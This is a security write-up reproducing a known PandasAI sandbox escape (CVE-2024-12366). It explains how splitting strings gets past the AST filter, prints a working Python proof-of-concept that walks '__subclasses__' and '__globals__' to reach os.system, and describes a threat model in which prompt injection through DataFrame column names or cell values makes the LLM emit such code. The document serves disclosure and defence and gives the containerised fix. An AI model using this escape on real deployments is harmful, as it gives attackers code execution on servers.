# PandasAI in-process sandbox escape → RCE (reproduction of CVE-2024-12366)

> **Honesty / attribution note.** This is a **reproduction of a KNOWN, already-disclosed
> vulnerability class**, documented here as a learning / portfolio artifact. It is **not**
> an original discovery and is **not** a candidate for a new CVE or bug bounty.
> - Tracked upstream as **CVE-2024-12366 / GHSA-vv2h-2w3q-3fx7 / CERT VU#148244** — the
>   security controls in **PandasAI ≤ 2.4.3** fail to contain malicious generated code.
> - The escape technique (subclass enumeration + `__globals__` traversal to reach `os`) is
>   described in prior research (arXiv:2309.02926) and has a public detection rule
>   (ATR-2026-01979). Earlier related: CVE-2024-23752.
> Included because it demonstrates the full methodology for finding and *proving* an
> RCE-class sandbox escape — which is the transferable skill.

## What PandasAI does

PandasAI answers natural-language questions about a DataFrame by having an LLM generate
Python, "sanitising" it, and running it with `exec()`. The sanitiser is the security
boundary: `pandasai/pipelines/chat/code_cleaning.py` filters the generated AST, and
`pandasai/helpers/optional.py:get_environment()` builds a restricted namespace.

## Why the sandbox fails

The restricted namespace still exposes **live module objects** (`pd`, `plt`, `np`) and a
62-name builtin allow-list that includes `getattr`, `type`, `object`, `vars`, `setattr`.
The AST filter (`_is_jailbreak`) rejects a top-level node only if its `ast.dump()` contains
one of the **literal substrings** `__subclasses__`, `__builtins__`, `__import__`; `_is_unsafe`
rejects `.to_*` writers. Two gaps make this trivially escapable:

1. **Substring matching is defeated by string-splitting.** `getattr(obj, "__subcla" + "sses__")`
   never contains the literal `__subclasses__`, so it passes the filter but resolves to
   `__subclasses__` at runtime.
2. **The gadget dunders are not filtered at all** — `__class__`, `__base__`, `__globals__`,
   `__init__` are all allowed, so the classic object-introspection chain works.

## Proof-of-concept (verified end-to-end)

[`poc.py`](poc.py) extracts PandasAI 2.3.2's **authentic** `WHITELISTED_BUILTINS`,
`get_environment()` namespace, and the real `_is_jailbreak` / `_is_unsafe` filter methods
from source, then runs this attacker-controlled (LLM-generated) code through them:

```python
b = ().__class__.__base__
subs = getattr(b, "__subcla" + "sses__")()          # string-split defeats the filter
for c in subs:
    gl = getattr(getattr(c, "__init__", None), "__glob" + "als__", None)
    if gl and "os" in gl:
        gl["os"].system("id > RCE_PROOF; echo PWNED_BY_PANDASAI > RCE_PROOF")
        break
```

Result: the payload **passes PandasAI's real `_clean_code` filters** and, when `exec()`'d in
the real restricted namespace, **runs `os.system`** (writes the marker file). No blocked
token (`__subclasses__`/`__builtins__`/`__import__`) appears in the source; no `.to_*`
method is used; no `import` statement is present.

Run (needs `pandas numpy matplotlib astor` and the PandasAI 2.3.2 sdist on disk):
```
python3 poc.py /path/to/pandasai-2.3.2/pandasai
```

## Threat model

Wherever an attacker can influence the LLM's output — a malicious question, or **indirect
prompt injection via the data itself** (column names / cell values the model reads) — in a
hosted "chat with your data" deployment, this is server-side RCE. The sandbox is the only
barrier, and it does not hold.

## Remediation (as upstream eventually did)

In-process allow/deny-list sandboxing of `exec`'d Python is not a viable boundary. PandasAI
3.x moved generated-code execution into a real isolation boundary (containerised sandbox).
That is the correct fix; byte-level AST string filters cannot be made safe.

## Lesson

Picking a higher-severity *target* (an LLM app that `exec`s generated code) yields a
higher-severity *bug class* (RCE) — but **severity is not novelty**. PandasAI's broken
sandbox is well-trodden; a prior-art check (CVE-2024-12366) turns this from "my RCE" into
"a reproduction." Always check before claiming.
